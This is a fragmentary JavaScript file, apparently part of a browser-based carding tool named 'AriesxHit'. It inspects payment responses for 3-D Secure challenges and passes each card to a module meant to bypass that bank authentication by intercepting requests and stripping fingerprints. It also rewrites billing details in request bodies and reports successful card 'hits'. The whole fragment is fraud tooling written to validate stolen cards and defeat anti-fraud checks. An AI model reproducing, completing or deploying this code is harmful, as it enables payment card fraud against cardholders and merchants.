...
(function () {
  ...
  // ==================== 3DS INTEGRATED BYPASS ====================

  function is3DSResponse(data) {
    ...
    // Check setup_intent
    if (data.setup_intent && data.setup_intent.status === 'requires_action') {
      return true;
    }

    // Check for redirect URL with 3DS indicators
    const redirectUrl = data.redirect_url || (data.payment_intent && data.payment_intent.next_action && data.payment_intent.next_action.redirect_to_url && data.payment_intent.next_action.redirect_to_url.url);
    if (redirectUrl && /3ds|authenticate|challenge/i.test(redirectUrl)) {
      return true;
    }
  ...
  function handleIntegrated3DSBypass(data, card) {
    console.log('[3DS] 3DS authentication detected - attempting integrated bypass');

    // Check if integrated bypass module is available
    if (window.AriesxHit3DSIntegrated) {
      console.log('[3DS] Using integrated 3DS bypass module');

      // Set the pending card for the bypass module
      window.AriesxHit3DSIntegrated.setPendingCard(card);

      // Set callbacks for success/failure
      window.AriesxHit3DSIntegrated.setCallbacks(
        // Success callback
        function(successCard) {
          console.log('[3DS] ✅ Bypass successful, sending hit');
          state.pendingCard = null;
          clearPendingCard();
          sendHitOnce(successCard);
        },
        // Failure callback
        function(failureCard, errorMessage) {
          console.log('[3DS] ❌ Bypass failed:', errorMessage);
          send('CARD_ERROR', {
            code: '3ds_bypass_failed',
            decline_code: '3ds_bypass_failed',
            message: errorMessage || '3DS bypass failed',
            card: failureCard
          });
        }
      );

      // The integrated bypass module will handle the rest automatically
      // It intercepts requests and removes fingerprints when 3DS is detected

    } else {
      // Fallback: just fail the card
      console.log('[3DS] Integrated bypass module not available, failing card');
      send('CARD_ERROR', {
        code: '3ds_required',
  ...
  function replaceBillingInBody(bodyStr) {
    ...
    // payment_method_data (setup_intents/confirm, aaa format)
...
clearPendingCard();
          ...
          if (status === 'succeeded' || data?.status === 'complete') {
            state.pendingCard = null;
            clearPendingCard();
            console.log('[HIT] Sending hit notification with card:', card);
            sendHitOnce(card);
          } else if (is3DSResponse(data)) {
            // Handle 3DS authentication with integrated bypass
            handleIntegrated3DSBypass(data, card);
          }
        }
      });
      return res;
